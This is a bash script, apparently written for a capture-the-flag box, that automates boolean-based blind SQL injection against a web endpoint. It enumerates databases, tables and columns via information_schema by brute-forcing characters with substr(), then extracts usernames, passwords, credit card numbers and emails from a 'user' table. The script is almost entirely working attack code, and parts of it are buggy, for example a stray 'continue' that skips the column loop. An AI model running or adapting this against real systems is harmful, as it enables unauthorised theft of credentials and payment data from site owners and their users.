#!/bin/bash

declare -A object
MYSQL_STANDARD_DATABASES=('mysql','information_schema')

function enumarteViaNumber() {
	((index++))
  	[ $index -le 100 ]
}

function enumarteViaAlphabet() {
	aplphabet='abcdefghijklmnopqrstuvwxyz'
        ((y++))
	echo $aplphabet[0]
	index=$(echo $aplphabet[$y])
	echo "$index"
	echo $y
        [ $y -le 26 ]
}

function loopThrow() {
	START=1
	END=100
	placeholderSqli="$1"

	while "${object['condition']}"; do
		sqli="$(printf "${placeholderSqli}" "$index")"
		request "$sqli"
                result=$(echo $?)
                if [ $result -eq 0 ]; then
                        echo "$index "
                        break
                fi
	done
	index=0
	y=0
}


function getLength() {
	# store the length in array!
	# required: ??
	# parameter: ??
	# IT Create from three parameter the sqli!

	START_Y=1
	#END_Y=$((object['amountOfDatabases']))
	END_Y=$2
	results=''
	sqlQuery="$1"
	object['condition']='enumarteViaNumber'
	for (( indey=$START_Y; indey<=$END_Y; indey++)); do
		count=$((indey-1))
		sqli="AND (${sqlQuery} LIMIT 1 OFFSET $count) = %d"
		results+=$(loopThrow "$sqli")
	done
	echo $results
}

function encodeToUrl() {
	# it can make some problems! NOT SURE!
	# PROBLEMES can come from the quots
	#echo $(python -c `from urllib.parse import quote; print(quote(\"${1}\"));`)

	# will that solve our Problem?
	echo $(echo "$1" | /usr/bin/jq -Rr '@uri')
}

function getAmount() {
	#echo 'i get the amount of the tables/columns/content'
	# required:
	# - database
	# - sqli
	# parameter: ??

	sqlQuery=$1

	#tableName='information_schema.tables'
	#condition="table_schema = ${database}"

	for index in {1..100}; do
		sqli="AND (${sqlQuery}) = $index"
		request "$sqli"
		result=$(echo $?)
		if [ $result -eq 0 ]; then
			echo $index
			break
		fi
	done
}

function bruteForceName() {
	# required:
	# - length
	# - length of names
	# - sql query
	#
	# FOR -> database/table/columns/content


	sqlQuery=$1
	placeholderSqli="AND (${sqlQuery}) = '%s'"

	# length of the result <int>
	#object['toSearchedDatabase']="$toSearchedDatabase"
	#length=$((object['amountOfDatabases']))
	length=$2
	# lenth of the names as <string list>
	databaseNameLength=($3)

	for (( index=0; index<=$((length-1)); index++ )); do
		# length of the string(database, table, column, content)
		limit="${databaseNameLength[$index]}"
		for (( i=0; i<=$limit; i++ )); do
			# sql function 'substr()' starts at the number one and not with zero
			extractionStartPosition=$((i+1))
			offset=$index
			for letter in {{a..z},@,_,\ ,$,.,/,{A..Z},{0..9}}; do
				sqli="$(printf "${placeholderSqli}" "$extractionStartPosition" "$offset" "$letter")"
				request "${sqli}"
				result=$(echo $?)
				#echo "result => $result"
				if [ $result -eq 0 ]; then
                       			name="${name}${letter}"
                        		break
                		fi
			done
		done
		# add to <string list> and clean the variable 'name'
		list+="${name} "
		name=''
	done
	echo "${list[@]}"
}

function request() {
	# rquired
	# - parsed url
	# take care of parsing url!

	SPACE="%20"
	encodedUrl=$(encodeToUrl "$1")
	/usr/bin/curl --silent -i "$URL/${PATH}${SPACE}${encodedUrl}" | /usr/bin/head -n 1 | /usr/bin/grep -q '200'
}

#SQLiTablesCount="SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=${database}"
#SQLiColumnsCount="SELECT COUNT(*) FROM ${table}"
#SQLILength="SELECT LENGTH(<column>) FROM information_schema.<column> WHERE <table_schema> = <table_name>"

URL="http://${target}"
PATH="products/1"

# find all datbases that are not standad only the number!
## count all databases
object['amountOfDatabases']=$(getAmount 'SELECT COUNT(*) FROM information_schema.schemata')
## get the length of the names
object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata' "${object['amountOfDatabases']}")
## get the names
sqlQuery="SELECT substr(LOWER(schema_name), %d,1) FROM information_schema.schemata LIMIT 1 OFFSET %d"
object['namesOfDatabases']=$(bruteForceName "$sqlQuery" "${object['amountOfDatabases']}" "${object['lengthOfDatabaseNames']}")


# find all names from a specific databse:
echo "which database want you to be searched: ${object['namesOfDatabases']} \n >>"
read toSearchedDatabase
object['toSearchedDatabase']="$toSearchedDatabase"
#object['toSearchedDatabase']="duckyinc"

## count tables
sqlQuery="SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = '${object['toSearchedDatabase']}'"
object['amountOfTables']=$(getAmount "$sqlQuery")

## get length of the names
sqlQuery="SELECT length(table_name) FROM information_schema.tables WHERE table_schema = '${object['toSearchedDatabase']}'"
object['lengthOfTablesNames']=$(getLength "$sqlQuery" "${object['amountOfTables']}")

## get the tables names
sqlQuery="SELECT substr(LOWER(table_name), %d,1) FROM information_schema.tables WHERE table_schema = '${object['toSearchedDatabase']}' LIMIT 1 OFFSET %d"
object['nameOfTables']=$(bruteForceName "$sqlQuery" "${object['amountOfTables']}" "${object['lengthOfTablesNames']}")

# find all columns from the all tables
# all tables => (product system_us user)
## count tables
object['nameOfTables']='product system_us user'
for table in ${object['nameOfTables']}; do
	continue
	echo "searching the Table => $table"
	# total conunt
	sqlQuery="SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}'"
	object['amountOfColumns']=$(getAmount "$sqlQuery")
	echo "${object['amountOfColumns']}"
	# name length
        sqlQuery="SELECT length(column_name) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}'"
        object['lengthOfColumns']=$(getLength "$sqlQuery" "${object['amountOfColumns']}")
	echo "${object['lengthOfColumns']}"
	# names
	sqlQuery="SELECT substr(LOWER(column_name), %d,1) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}' LIMIT 1 OFFSET %d"
        object['namesOfColumns']=$(bruteForceName "$sqlQuery" "${object['amountOfColumns']}" "${object['lengthOfColumns']}")
	echo "The table ${table} has the follwing columns ${object['namesOfColumns']}"

done
# SELECT columns from table limit 1 offset 1;

object['namesOfColumns']='username _password credit_card email company'
# Content
for column in ${object['namesOfColumns']}; do
	if [ "$column" == 'id' ]; then
		continue
	fi

	echo $column

        echo "searching the Table => $column"
        # total conunt
        sqlQuery="SELECT COUNT($column) FROM user"
        object['amountOfContent']=$(getAmount "$sqlQuery")
        echo "${object['amountOfContent']}"
        # name length
        sqlQuery="SELECT length($column) FROM user"
        object['lengthOfContent']=$(getLength "$sqlQuery" "${object['amountOfContent']}")
        echo "${object['lengthOfContent']}"
        # names
        sqlQuery="SELECT substr($column, %d,1) FROM user LIMIT 1 OFFSET %d"
        object['namesOfContent']=$(bruteForceName "$sqlQuery" "${object['amountOfContent']}" "${object['lengthOfContent']}")
        echo "${object['namesOfContent']}"

done

sqlQuery="SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema = '${object['toSearchedDatabase']}' AND table_name = '${table}'"
#object['amountOfTables']=$(getAmount "$sqlQuery")

#echo "${object['nameOfTables']}"
